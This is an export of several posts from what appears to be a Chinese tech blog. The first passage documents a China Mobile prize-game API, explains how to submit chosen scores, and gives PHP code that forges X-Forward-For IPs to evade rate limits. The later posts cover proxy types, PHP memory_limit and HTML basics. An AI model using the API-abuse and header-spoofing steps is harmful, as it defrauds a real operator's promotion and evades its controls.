&#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            "hasLocked": "1", // F_IS_NEED_UNLOCK=1时有该字段，1表示好友已经解锁 0表示等好友解锁</span><br><span class="line">                            "F_IS_NEED_UNLOCK": "1",</span><br><span class="line">                            "F_ID": "GIFT000002",</span><br><span class="line">                            "hasDrawed": "1",  </span><br><span class="line">                            "F_START": "300",</span><br><span class="line">                            "F_END": "600",</span><br><span class="line">                            "F_BEST_GIFT": "0.66元/300M"</span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">"hasLocked"</span>: <span class="string">"1"</span>,</span><br><span class="line">                            <span class="attr">"F_IS_NEED_UNLOCK"</span>: <span class="string">"1"</span>,</span><br><span class="line">                            <span class="attr">"F_ID"</span>: <span class="string">"GIFT000003"</span>,</span><br><span class="line">                            <span class="attr">"hasDrawed"</span>: <span class="string">"1"</span>,</span><br><span class="line">                            <span class="attr">"F_START"</span>: <span class="string">"600"</span>,</span><br><span class="line">                            <span class="attr">"F_END"</span>: <span class="string">"1000"</span>,</span><br><span class="line">                            <span class="attr">"F_BEST_GIFT"</span>: <span class="string">"0.99元/500M"</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">"hasLocked"</span>: <span class="string">"0"</span>,</span><br><span class="line">                            <span class="attr">"F_IS_NEED_UNLOCK"</span>: <span class="string">"1"</span>,</span><br><span class="line">                            <span class="attr">"F_ID"</span>: <span class="string">"GIFT000004"</span>,</span><br><span class="line">                            <span class="attr">"hasDrawed"</span>: <span class="string">"0"</span>,</span><br><span class="line">                            <span class="attr">"F_START"</span>: <span class="string">"1000"</span>,</span><br><span class="line">                            <span class="attr">"F_END"</span>: <span class="string">"9999"</span>,</span><br><span class="line">                            <span class="attr">"F_BEST_GIFT"</span>: <span class="string">"5元/1G"</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            "jh_status": "0",</span><br><span class="line">            "join": "3",// 1表示可以开始游戏 2表示需要分享好友获取游戏机会 其他表示次数用完</span><br><span class="line">            "sharePhone": "xxxx"// 当前需要解锁的手机号码</span><br><span class="line">        &#125;,</span><br><span class="line">        "code": 0,// 0表示认证用户 1表示用户未登录 4表示活动未开始或已结束 其他表示服务器繁忙</span><br><span class="line">        "info": "查询成功"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>


<h4 id="游戏开始"><a href="#游戏开始" class="headerlink" title="游戏开始"></a>游戏开始</h4><p><strong>简要描述：</strong></p>
<ul>
<li>该接口获取是否可以游戏，同时返回游戏参数，频率限制15秒</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/luckDayGame/gameStart.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/luckDayGame/gameStart.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"obj"</span>: &#123;</span><br><span class="line">            "scoreConfig": "-2,-2,-3,-5,-8,2,3,5,5,5,5,5,10,10,15,15",// 分值规律，负数表示减分，正数表示加分</span><br><span class="line">            "totalScore": 528,// 当前总分值</span><br><span class="line">            "keys": "d36100f7-aae0-4ed5-ae23-dc2018ed9e94",// 当前分值对应的key，游戏结束后需要该参数</span><br><span class="line">            "progressBarConfig": [ // 段位</span><br><span class="line">                0,</span><br><span class="line">                100,</span><br><span class="line">                300,</span><br><span class="line">                600,</span><br><span class="line">                <span class="number">1000</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        "code": 0, // 0表示可以开始，1表示登录超时，7,3表示游戏次数不够 2表示服务器忙</span><br><span class="line">        "info": "游戏开始"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="游戏结束"><a href="#游戏结束" class="headerlink" title="游戏结束"></a>游戏结束</h4><p><strong>简要描述：</strong></p>
<ul>
<li>返回用户玩游戏获得积分结果，这个接口后台不知道是如何处理的，当参数传递错误，返回的body为空，猜测是一个BUG，频率限制15秒</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/luckDayGame/gameOver.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/luckDayGame/gameOver.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
<tr>
<td align="left">key</td>
<td align="left">是</td>
<td align="left">string</td>
<td>游戏开始接口获取</td>
</tr>
<tr>
<td align="left">userScore</td>
<td align="left">int</td>
<td align="left">string</td>
<td>获得分值，游戏开始接口获取:scoreConfig里面正数则的总和</td>
</tr>
<tr>
<td align="left">scoreDetail</td>
<td align="left">否</td>
<td align="left">string</td>
<td>可选，分数详情，例如： 30,30,20,10,5,5</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>:&#123;</span><br><span class="line">        <span class="attr">"obj"</span>:&#123;</span><br><span class="line">            "isAchieved":true,// 达到分数</span><br><span class="line">            "needScore":155, // 距离下一个段位需要的分数</span><br><span class="line">            "totalScore":145,// 本次游戏后游戏总分</span><br><span class="line">            "phone":"18281872608",// 玩游戏的手机号码</span><br><span class="line">            "countStatus":1, // 0表示这是最后一次游戏，1表示下次一游戏需要分享</span><br><span class="line">            "isDraw":false, //  是否已经抽奖 true表示已抽 false表示未抽</span><br><span class="line">            "giftId":"GIFT000001",// 当前正在挑战的奖品ID</span><br><span class="line">            "bestGift":"100M", // 能够获得最佳的礼物</span><br><span class="line">            "isUnlock":false, //  是否已经解锁，true是 false没有</span><br><span class="line">            "isNeedUnlock":false// 是否需要解锁 true需要解锁 false不需要解说</span><br><span class="line">        &#125;,</span><br><span class="line">        "code":0,// 0表示提交成功 1表示登录超时</span><br><span class="line">        "info":"游戏结束"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="分享接口"><a href="#分享接口" class="headerlink" title="分享接口"></a>分享接口</h4><p><strong>简要描述：</strong></p>
<ul>
<li>每个用户每天拥有两次玩游戏的机会，请求该接口可以再玩一次，频率限制15秒</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/luckday/saveShareLog.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/luckday/saveShareLog.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"result"</span>: &#123;</span><br><span class="line">    <span class="attr">"obj"</span>: <span class="literal">null</span>,</span><br><span class="line">    "code": 0,// 0表示分享成功 1表示未登录</span><br><span class="line">    "info": "入库成功"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>


<h4 id="好友解锁"><a href="#好友解锁" class="headerlink" title="好友解锁"></a>好友解锁</h4><p><strong>简要描述：</strong></p>
<ul>
<li>如果用户获得积分达到了抽奖条件，而这个奖励需要好友激活，请求该接口可以帮助用户激活，频率限制20秒</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/luckday/unlock.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/luckday/unlock.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie,<code>注意这里是你好友的cookie，因为是他帮你解锁，而不是自己给自己解锁</code></td>
</tr>
<tr>
<td align="left">sharePhone</td>
<td align="left">是</td>
<td align="left">string</td>
<td>需要解锁的手机号码，该字段需要base64编码</td>
</tr>
<tr>
<td align="left">gift_id</td>
<td align="left">是</td>
<td align="left">string</td>
<td>解锁的礼物ID,该字段需要base64编码, 例如 base64encode(‘GIFT000001’)</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>:&#123;</span><br><span class="line">        <span class="attr">"obj"</span>:<span class="number">2</span>,</span><br><span class="line">        "code":0, // 0表示解锁成功 3未达到抽奖条件,不能解锁! 4活动未开始或已结束! 20 20秒内不能重复点击，请稍后再试! 5 助力人不能是自己 6步数区间未配置 7分享人未满足改档分数，认证失败  11解锁人已解锁，认证失败 12分享人已抽过该礼包</span><br><span class="line">        "info":"解锁成功"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>


<h4 id="活动抽奖"><a href="#活动抽奖" class="headerlink" title="活动抽奖"></a>活动抽奖</h4><p><strong>简要描述：</strong></p>
<ul>
<li>奖励处理激活状态后可以请求该接口获取奖品，频率限制15秒</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccCampaign/luckday/draw.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccCampaign/luckday/draw.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
<tr>
<td align="left">gift_id</td>
<td align="left">是</td>
<td align="left">string</td>
<td>解锁的礼物ID,该字段需要base64编码, 例如 base64encode(‘GIFT000001’)</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>:&#123;</span><br><span class="line">        "obj":&#123; // 抽奖的奖品</span><br><span class="line">            "f_prize":"30M国内流量券",</span><br><span class="line">            "f_sendType":"5",// 5流量  2 话费</span><br><span class="line">            "f_num":"30", // 如果是流量这里表示抽中多少M流量 如果是话费这里是抽中多少元话费</span><br><span class="line">            "f_id":"1",// 礼品ID</span><br><span class="line">            "gift_id":"GIFT000001"// 礼物ID</span><br><span class="line">        &#125;,</span><br><span class="line">        "code":0,// 0中奖 1未登录 7未中奖</span><br><span class="line">        "info":"抽奖成功"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>


<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>接口做了IP访问频率限制，可以尝试在请求头部改变 <code>X-Forward-For</code> 来解决。下面是示例代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 随机生成国内的IP地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_ip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ip_long = <span class="keyword">array</span>(</span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'607649792'</span>, <span class="string">'608174079'</span>), <span class="comment">// 36.56.0.0-36.63.255.255</span></span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'1038614528'</span>, <span class="string">'1039007743'</span>), <span class="comment">// 61.232.0.0-61.237.255.255</span></span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'1783627776'</span>, <span class="string">'1784676351'</span>), <span class="comment">// 106.80.0.0-106.95.255.255</span></span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'2035023872'</span>, <span class="string">'2035154943'</span>), <span class="comment">// 121.76.0.0-121.77.255.255</span></span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'2078801920'</span>, <span class="string">'2079064063'</span>), <span class="comment">// 123.232.0.0-123.235.255.255</span></span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'-1950089216'</span>, <span class="string">'-1948778497'</span>), <span class="comment">// 139.196.0.0-139.215.255.255</span></span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'-1425539072'</span>, <span class="string">'-1425014785'</span>), <span class="comment">// 171.8.0.0-171.15.255.255</span></span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'-1236271104'</span>, <span class="string">'-1235419137'</span>), <span class="comment">// 182.80.0.0-182.92.255.255</span></span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'-770113536'</span>, <span class="string">'-768606209'</span>), <span class="comment">// 210.25.0.0-210.47.255.255</span></span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'-569376768'</span>, <span class="string">'-564133889'</span>), <span class="comment">// 222.16.0.0-222.95.255.255</span></span><br><span class="line">    );</span><br><span class="line">    $rand_key = mt_rand(<span class="number">0</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">return</span> $ip = long2ip(mt_rand($ip_long[$rand_key][<span class="number">0</span>], $ip_long[$rand_key][<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line">$curl = <span class="keyword">new</span> Curl();</span><br><span class="line">$curl-&gt;setHeader(<span class="string">'X-Forward-For'</span>, rand_ip());</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>图解正向代理、反向代理、透明代理</title>
    <url>/articles/%E5%9B%BE%E8%A7%A3%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h3 id="一、正向代理"><a href="#一、正向代理" class="headerlink" title="一、正向代理"></a>一、正向代理</h3><p>一般情况下，如果没有特别说明，代理技术默认说的是正向代理技术。关于正向代理的概念如下： 正向代理(forward)是一个位于客户端【用户A】和原始服务器(origin server)【服务器B】之间的服务器【代理服务器Z】，为了从原始服务器取得内容，用户A向代理服务器Z发送一个请求并指定目标(服务器B)，然后代理服务器Z向服务器B转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。</p>
<p><img src="/articles/图解正向代理-反向代理-透明代理/0.jpg" alt></p>
<p>从上面的概念中，我们看出，文中所谓的正向代理就是代理服务器替代访问方【用户A】去访问目标服务器【服务器B】</p>
<p>这就是正向代理的意义所在。而为什么要用代理服务器去代替访问方【用户A】去访问服务器B呢？这就要从代理服务器使用的意义说起。</p>
<p>使用正向代理服务器作用主要有以下几点：</p>
<p>1、访问本无法访问的服务器B，如下图1.2</p>
<p><img src="/articles/图解正向代理-反向代理-透明代理/1.jpg" alt></p>
<p>我们抛除复杂的网络路由情节来看图1.2，假设图中路由器从左到右命名为R1,R2假设最初用户A要访问服务器B需要经过R1和R2路由器这样一个路由节点，如果路由器R1或者路由器R2发生故障，那么就无法访问服务器B了。但是如果用户A让代理服务器Z去代替自己访问服务器B，由于代理服务器Z没有在路由器R1或R2节点中，而是通过其它的路由节点访问服务器B，那么用户A就可以得到服务器B的数据了。现实中的例子就是“翻墙”。不过自从VPN技术被广泛应用外，“翻墙”不但使用了传统的正向代理技术，有的还使用了VPN技术。</p>
<p>2、加速访问服务器B</p>
<p>这种说法目前不像以前那么流行了，主要是带宽流量的飞速发展。早期的正向代理中，很多人使用正向代理就是提速。还是如图1.2 假设用户A到服务器B，经过R1路由器和R2路由器，而R1到R2路由器的链路是一个低带宽链路。而用户A到代理服务器Z，从代理服务器Z到服务器B都是高带宽链路。那么很显然就可以加速访问服务器B了。</p>
<p>3、Cache作用</p>
<p>Cache（缓存）技术和代理服务技术是紧密联系的（不光是正向代理，反向代理也使用了Cache（缓存）技术。还如上图所示，如果在用户A访问服务器B某数据J之前，已经有人通过代理服务器Z访问过服务器B上得数据J，那么代理服务器Z会把数据J保存一段时间，如果有人正好取该数据J，那么代理服务器Z不再访问服务器B，而把缓存的数据J直接发给用户A。这一技术在Cache中术语就叫Cache命中。如果有更多的像用户A的用户来访问代理服务器Z，那么这些用户都可以直接从代理服务器Z中取得数据J，而不用千里迢迢的去服务器B下载数据了。</p>
<p>4、客户端访问授权</p>
<p>这方面的内容现今使用的还是比较多的，例如一些公司采用ISA SERVER做为正向代理服务器来授权用户是否有权限访问互联网，</p>
<p><img src="/articles/图解正向代理-反向代理-透明代理/2.jpg" alt></p>
<p>防火墙作为网关，用来过滤外网对其的访问。假设用户A和用户B都设置了代理服务器，用户A允许访问互联网，而用户B不允许访问互联网（这个在代理服务器Z上做限制）这样用户A因为授权，可以通过代理服务器访问到服务器B，而用户B因为没有被代理服务器Z授权，所以访问服务器B时，数据包会被直接丢弃。</p>
<p>5、隐藏访问者的行踪</p>
<p>我们可以看出服务器B并不知道访问自己的实际是用户A，因为代理服务器Z代替用户A去直接与服务器B进行交互。如果代理服务器Z被用户A完全控制（或不完全控制），会惯以“肉鸡”术语称呼。</p>
<p><img src="/articles/图解正向代理-反向代理-透明代理/3.jpg" alt> </p>
<p>我们总结一下 正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须设置正向代理服务器，当然前提是要知道正向代理服务器的IP地址，还有代理程序的端口。</p>
<h3 id="二、反向代理"><a href="#二、反向代理" class="headerlink" title="二、反向代理"></a>二、反向代理</h3><p>反向代理正好与正向代理相反，对于客户端而言代理服务器就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间(name-space)中的内容发送普通请求，接着反向代理将判断向何处(原始服务器)转交请求，并将获得的内容返回给客户端。 使用反向代理服务器的作用如下：</p>
<p>1、保护和隐藏原始资源服务器如下图2.1</p>
<p><img src="/articles/图解正向代理-反向代理-透明代理/4.jpg" alt></p>
<p>用户A始终认为它访问的是原始服务器B而不是代理服务器Z，但实用际上反向代理服务器接受用户A的应答，从原始资源服务器B中取得用户A的需求资源，然后发送给用户A。由于防火墙的作用，只允许代理服务器Z访问原始资源服务器B。尽管在这个虚拟的环境下，防火墙和反向代理的共同作用保护了原始资源服务器B，但用户A并不知情。</p>
<p>2、负载均衡</p>
<p><img src="/articles/图解正向代理-反向代理-透明代理/6.png" alt> </p>
<p>当反向代理服务器不止一个的时候，我们甚至可以把它们做成集群，当更多的用户访问资源服务器B的时候，让不同的代理服务器Z（x）去应答不同的用户，然后发送不同用户需要的资源。</p>
<p>当然反向代理服务器像正向代理服务器一样拥有CACHE的作用，它可以缓存原始资源服务器B的资源，而不是每次都要向原始资源服务器B请求数据，特别是一些静态的数据，比如图片和文件，如果这些反向代理服务器能够做到和用户X来自同一个网络，那么用户X访问反向代理服务器X，就会得到很高质量的速度。这正是CDN技术的核心。</p>
<p><img src="/articles/图解正向代理-反向代理-透明代理/7.png" alt></p>
<p>我们并不是讲解CDN，所以去掉了CDN最关键的核心技术智能DNS。只是展示CDN技术实际上利用的正是反向代理原理这块。</p>
<p>反向代理结论与正向代理正好相反，对于客户端而言它就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间(name-space)中的内容发送普通请求，接着反向代理将判断向何处(原始服务器)转交请求，并将获得的内容返回给客户端，就像这些内容原本就是它自己的一样。</p>
<p>基本上，网上做正反向代理的程序很多，能做正向代理的软件大部分也可以做反向代理。开源软件中最流行的就是squid，既可以做正向代理，也有很多人用来做反向代理的前端服务器。另外MS ISA也可以用来在WINDOWS平台下做正向代理。反向代理中最主要的实践就是WEB服务，近些年来最火的就是Nginx了。网上有人说NGINX不能做正向代理，其实是不对的。NGINX也可以做正向代理，不过用的人比较少了。</p>
<h3 id="三、透明代理"><a href="#三、透明代理" class="headerlink" title="三、透明代理"></a>三、透明代理</h3><p>如果把正向代理、反向代理和透明代理按照人类血缘关系来划分的话。那么正向代理和透明代理是很明显堂亲关系，而正向代理和反向代理就是表亲关系了 。</p>
<p>透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改编你的request fields（报文），并会传送真实IP。注意，加密的透明代理则是属于匿名代理，意思是不用设置使用代理了。 透明代理实践的例子就是时下很多公司使用的行为管理软件。</p>
<p><img src="/articles/图解正向代理-反向代理-透明代理/5.jpg" alt> </p>
<p>用户A和用户B并不知道行为管理设备充当透明代理行为，当用户A或用户B向服务器A或服务器B提交请求的时候，透明代理设备根据自身策略拦截并修改用户A或B的报文，并作为实际的请求方，向服务器A或B发送请求，当接收信息回传，透明代理再根据自身的设置把允许的报文发回至用户A或B，如上图，如果透明代理设置不允许访问服务器B，那么用户A或者用户B就不会得到服务器B的数据。</p>
<p>正向代理代理的对象是客户端，反向代理代理的对象是服务端</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>如何修改PHP的memory_limit限制</title>
    <url>/articles/%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9PHP%E7%9A%84memory-limit%E9%99%90%E5%88%B6/</url>
    <content><![CDATA[<p>在运行PHP程序，通常会遇到“Fatal Error: Allowed memory size of xxxxxx bytes exhausted”的错误, 这个意味着PHP脚本使用了过多的内存，并超出了系统对其设置的允许最大内存。解决这个问题，首先需要查看你的程序是否分配了过多的内存，在程序没有问题的情况下，你可以通过一下方法来增加PHP的内存限制（memory_limit)。</p>
<p><strong>检查php的内存限制值</strong></p>
<p>为了查看这个值，你需要建立一个空的php文件，比如view-php-info.php。然后将一下代码贴到里面。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将这个脚本放到你的PHP主机上，然后在浏览器中调用它。这时你可以看到你的PHP环境配置的信息，其中有一部分是关于”memory_limit”的, 如下图:</p>
<p><img src="/articles/如何修改PHP的memory-limit限制/0.png" alt></p>
<p><code>注：你可以用这种方法来查看php的其他参数设置，不仅仅是memory_limit</code></p>
<p><strong>memory_limit应该设为多少？</strong></p>
<p>这个完全依赖于你的应用的要求。比如Wordpress，运行起核心代码需要32MB。Drupal 6则要求这个值最小为16MB，并推荐设置为32MB。如果你又安装不少的插件（plugins），尤其是那些要进行图像处理的模块，那么你可能需要128MB或更高的内存。</p>
<p><strong>如何设置memory_limit</strong></p>
<p><strong>方法1: php.ini</strong></p>
<p>最简单或常用的方法是修改php.ini</p>
<ul>
<li>首先找到对你的网站生效的php.ini文件</li>
</ul>
<p>由于有多个地方都可以设置php的参数，找到正确的配置文件，并进行更改是首先要做的一步。如果你上面的方法建立了php文件来查看其配置参数，则你可以找到 <code>Loaded Configuration File</code> 这一项，以下是个例子：</p>
<p><img src="/articles/如何修改PHP的memory-limit限制/1.png" alt> </p>
<p>对于Linux用户，你可以通过执行<code>php -i | grep Loaded Configuration File</code>来找到对应的配置文件。而Windows用户，你可以尝试修改你的php安装目录下的php.ini。</p>
<ul>
<li>编辑php.ini</li>
</ul>
<p>在php.ini中，找到<code>memory_limit</code>这一项，如果没有，你可以在文件的尾部自己增加这个参数。以下是一些设置范例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory_limit = 128M ; 可以将128M改为任何你想设置的值</span><br></pre></td></tr></table></figure>

<ul>
<li><p>保存文件</p>
</li>
<li><p>重启web 服务器</p>
</li>
</ul>
<p>如果是web服务器使用Apache, 则执行:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">httpd restart</span><br></pre></td></tr></table></figure>

<p>有些情况下，你可能不被允许私修改php.ini。比如如果你购买了虚拟主机服务，但是你的服务商确禁止你修改这个文件。那么，你可以需要考虑用其他方法来增加memory_limit的值。</p>
<p><strong>方法2: .htaccess</strong></p>
<p><code>说明: 这种方法只有在php以Apache模块来执行时才生效.</code></p>
<p>在你的网站的根目录下找到”.htaccess”文件，如果没有，可以自己创建一个。然后把以下配置放入其中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value memory_limit 128M ; // 可以将128M改为任何你想设置的值</span><br></pre></td></tr></table></figure>

<p><strong>方法3: 运行时修改php的内存设置</strong></p>
<p>在你的php代码中增加以下命令行即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ini_set(&apos;memory_limit&apos;, &apos;128M&apos;);</span><br></pre></td></tr></table></figure>

<p>如果你使用虚拟主机，有可能会出现memory_limit的值修改失败。这个需要联系你的服务商看怎么处理，通常他们限制了可以设置的最大值或者根本就不允许你修改。如果他们的环境真的无法满足你的要求，那么你可能要考虑换一个主机服务商。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>前端知识点总结</title>
    <url>/articles/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="知识点一：DOCTYPE和浏览器渲染模式"><a href="#知识点一：DOCTYPE和浏览器渲染模式" class="headerlink" title="知识点一：DOCTYPE和浏览器渲染模式"></a>知识点一：DOCTYPE和浏览器渲染模式</h3><p>文档类型，一个文档类型标记是一种标准通用标记语言的文档类型声明，它的目的是要告诉标准通用标记语言解析器，它应该使用什么样的文档类型定义（DTD）来解析文档。Doctype还会对浏览器的渲染模式产生影响，不同的渲染模式会影响到浏览器对于 CSS 代码甚至 JavaScript 脚本的解析，所以Doctype是非常关键的，尤其是在 IE 系列浏览器中，由DOCTYPE 所决定的 HTML 页面的渲染模式至关重要。</p>
<p>浏览器解析HTML方式：</p>
<ul>
<li><p>非怪异（标准）模式</p>
</li>
<li><p>怪异模式</p>
</li>
<li><p>部分怪异（近乎标准）模式</p>
</li>
</ul>
<p>在“标准模式”(standards mode) 页面按照 HTML 与 CSS 的定义渲染，而在“怪异模式(quirks mode) 模式”中则尝试模拟更旧的浏览器的行为。 一些浏览器（例如，那些基于 Mozilla 的 Gecko 渲染引擎的，或者 Internet Explorer 8 在 strict mode 下）也使用一种尝试于这两者之间妥协的“近乎标准”(almost standards) 模式，实施了一种表单元格尺寸的怪异行为，除此之外符合标准定义。</p>
<p>一个不含任何 DOCTYPE 的网页将会以 怪异(quirks) 模式渲染。</p>
<p>HTML5提供的<code>&lt;DOCTYPE html&gt;</code>是标准模式，向后兼容的, 等同于开启了标准模式，那么浏览器就得老老实实的按照W3C的 标准解析渲染页面，这样一来，你的页面在所有的浏览器里显示的就都是一个样子了。</p>
<h3 id="知识点二：html5"><a href="#知识点二：html5" class="headerlink" title="知识点二：html5"></a>知识点二：html5</h3><p>文件类型声明（&lt;!DOCTYPE&gt;）仅有一型：<code>&lt;!DOCTYPE HTML&gt;</code>。</p>
<p>新的解析顺序：不再基于SGML。</p>
<p>新的元素：section, video, progress, nav, meter, time, aside, canvas,command, datalist, details, embed, figcaption, figure, footer,header, hgroup, keygen, mark, output, rp, rt, ruby, source, summary,wbr。 input</p>
<p>元素的新类型：date, email, url等等。</p>
<p>新的属性：ping（用于a与area）,charset（用于meta）, async（用于script）。</p>
<p>全域属性：id, tabindex, repeat。</p>
<p>新的全域属性：contenteditable, contextmenu, draggable, dropzone, hidden,</p>
<p>spellcheck。</p>
<p>移除元素：acronym, applet, basefont, big, center, dir, font,</p>
<p>frame, frameset, isindex, noframes, strike, tt。</p>
<h3 id="知识点三：常用meta整理"><a href="#知识点三：常用meta整理" class="headerlink" title="知识点三：常用meta整理"></a>知识点三：常用meta整理</h3><ul>
<li>概要</li>
</ul>
<p>标签提供关于HTML文档的元数据。元数据不会显示在页面上，但是对于机器是可读的。它可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。 ——<a href="http://www.w3school.com.cn/" target="_blank" rel="noopener">W3School</a></p>
<ul>
<li>必要属性</li>
</ul>
<p>属性值描述contentsome text定义与http-equiv或name属性相关的元信息</p>
<ul>
<li>可选属性</li>
</ul>
<p>属性值描述 http-equivcontent-type / expire / refresh / set-cookie把content属性关联到HTTP头部。nameauthor / description / keywords / generator / revised / others把 content 属性关联到一个名称。contentsome text定义用于翻译 content 属性值的格式。</p>
<ul>
